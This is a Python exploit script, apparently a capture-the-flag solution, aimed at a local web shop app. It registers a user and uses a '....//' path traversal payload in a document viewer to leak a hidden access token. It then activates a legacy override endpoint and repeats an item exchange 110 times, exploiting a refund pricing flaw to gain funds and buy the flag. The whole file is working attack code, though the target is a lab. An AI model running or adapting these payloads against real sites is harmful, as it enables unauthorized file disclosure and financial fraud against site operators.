import requests
import re
import sys

URL = "http://localhost:5001"
S = requests.Session()
USERNAME = "hacker_zero"

def main():
    # 1. Login
    S.post(f"{URL}/register", data={"username": USERNAME})
    print("[*] Logged in.")

    # 2. Path Traversal
    # Description said hint is at /coupon
    # /coupon gives 403.
    # We use doc viewer to traverse UP one level (....//) to reach 'coupon'
    
    print("[*] Exploiting Path Traversal to read 'coupon'...")
    payload = "....//coupon"
    
    resp = S.get(f"{URL}/doc_viewer", params={"doc": payload})
    
    if "SHADOW_ROOT_99" not in resp.text:
        print("[-] Failed to read coupon file.")
        sys.exit(1)
        
    print("[+] Coupon File Leaked:")
    print(resp.text.strip())

    # 3. Parse Secrets
    token = "SHADOW_ROOT_99"
    endpoint = "/api/v1/legacy_activate"
    
    # 4. Activate
    print("[*] Activating Override...")
    S.get(f"{URL}{endpoint}", params={"access_token": token})

    # 5. Arbitrage Loop
    print("[*] Executing Arbitrage Loop...")
    S.post(f"{URL}/buy", data={"item": "watch"}) # Buy for $1
    
    # Get Inventory ID
    dash = S.get(URL).text
    inv_id = re.search(r"exchange\('([a-f0-9\-]+)'", dash).group(1)

    # Loop (Refund $100, Cost $1 = Profit $99)
    for i in range(110): 
        S.post(f"{URL}/exchange", data={"inventory_id": inv_id, "target_item": "watch"})
    
    # 6. Win
    print("[*] Buying Flag...")
    final = S.post(f"{URL}/buy", data={"item": "flag"}).json()
    
    if 'flag' in final:
        print(f"\n>>> FLAG: {final['flag']} <<<\n")

if __name__ == "__main__":
    main()